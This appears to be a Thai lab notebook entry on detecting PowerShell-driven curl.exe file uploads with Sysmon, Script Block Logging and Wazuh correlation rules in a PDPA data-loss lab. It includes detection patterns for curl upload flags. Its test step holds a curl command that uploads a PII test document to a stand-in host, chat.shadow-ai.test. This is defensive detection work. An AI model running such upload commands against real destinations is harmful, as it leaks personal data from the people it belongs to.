# วันที่ 5: PowerShell ส่งไฟล์ออก (ตรวจจับผ่าน Sysmon + Script Block Logging)

สถานการณ์: ผู้ใช้หรือสคริปต์สั่ง PowerShell ให้เรียก `curl.exe` อัปโหลดไฟล์ไปเว็บภายนอก ส่วนที่ทดสอบได้กับ
lab คือเว็บจำลอง `*.test` ผ่าน mini SWG ของวันที่ 4 เท่านั้น

Endpoint มองเห็นจาก 2 แหล่ง:

| แหล่ง | Event | Wazuh base rule | rule ใหม่ |
| --- | --- | --- | --- |
| Sysmon process creation | Event 1 (`curl.exe` ที่ parent เป็น `powershell.exe` และมี `-F`/`-T`/`--upload-file`/`--data-binary`) | 61603 | 100150 (level 8) |
| PowerShell Script Block Logging | Event 4104 (script ที่เรียก curl แบบอัปโหลด หรือ `Invoke-WebRequest/RestMethod -InFile`) | 91802 | 100151 (level 8) |

รวมกับ SWG: ถ้าภายใน 120 วินาที endpoint เห็น 100150 และ SWG เห็นเลขบัตร 10 ตัวขึ้นไปส่งไปปลายทางเสี่ยง
(100122 หรือ 100123) จะขึ้น **100152 / 100153 / 100154 (level 15)** ซึ่งเป็น 2 เซนเซอร์ยืนยันกัน
ตามหลักเดียวกับ 100130/100131 ทุก rule ติด MITRE T1059.001 + T1567

## ติดตั้ง

Windows VM (PowerShell แบบ Admin):

```powershell
powershell -ExecutionPolicy Bypass -File C:\pdpa-repo\windows\enable-powershell-logging.ps1
```

Ubuntu (Wazuh manager):

```bash
sudo cp wazuh/pdpa_rules_powershell.xml /var/ossec/etc/rules/
sudo chown wazuh:wazuh /var/ossec/etc/rules/pdpa_rules_powershell.xml
sudo /var/ossec/bin/wazuh-analysisd -t && sudo systemctl restart wazuh-manager
```

ชื่อไฟล์ต้องเรียงหลัง `pdpa_rules.xml` เพราะ Wazuh โหลด rule ตามชื่อไฟล์ และ 100152 อ้างถึง 100122/100123

## ทดสอบ (Windows VM, PowerShell ธรรมดา)

```powershell
powershell -NoProfile -Command { Set-Location C:\pdpa-lab; curl.exe -x http://192.168.56.102:8080 --ssl-no-revoke -s -o NUL -w "%{http_code}" -F "file=@testdata\0003_pii.docx" https://chat.shadow-ai.test/api/upload }
```

ผลใน lab (8 พ.ย. 2026): 100151 และ 100150 จาก `win-endpoint-01`, 100122 จาก SWG แล้ว **100152 level 15**
เมื่ออัปโหลดไฟล์ high 25 IDs ไป QuickShare ได้ 100123 แล้ว 100152 อีกครั้ง

## สิ่งที่เจอ

| ปัญหา | สาเหตุ | วิธีแก้ |
| --- | --- | --- |
| Sysmon ของ curl.exe ไม่ขึ้นใน alerts | rule พื้นฐาน 61603 เป็น level 0 (event เข้ามาแต่ไม่ alert) และ config Sysmon ของ lab ไม่เก็บ Event 3 ของ curl.exe | เปิด `logall_json` ชั่วคราวเพื่อดู event ดิบและชื่อ field แล้วเขียน rule ลูกของ 61603 จาก command line; ปิด `logall_json` คืน |
| correlation 100152 ไม่ขึ้นทั้งที่ 100122 กับ 100150 ห่างกัน 1 วินาที | Wazuh จับคู่ `if_matched_sid` เฉพาะ event จาก agent เดียวกันเป็นค่าเริ่มต้น แต่ SWG มาจาก manager (000) ส่วน PowerShell มาจาก agent 001 | ใส่ `<global_frequency />` ใน rule correlation |
| ลำดับ event ไม่แน่นอน | event ของ agent อาจมาช้ากว่า log ของ manager ไม่กี่วินาที | ทำ rule ทั้งสองทิศ: 100152 (SWG มาหลัง) และ 100153/100154 (endpoint มาหลัง) |

ข้อจำกัด: เหมือนวันที่ 3 คือ Wazuh เชื่อมสอง event ด้วยชื่อไฟล์ไม่ได้ correlation จึงบอกได้แค่ว่า
"PowerShell อัปโหลดอะไรบางอย่าง และ SWG เจอเลขบัตรในการอัปโหลดในเวลาใกล้กัน"
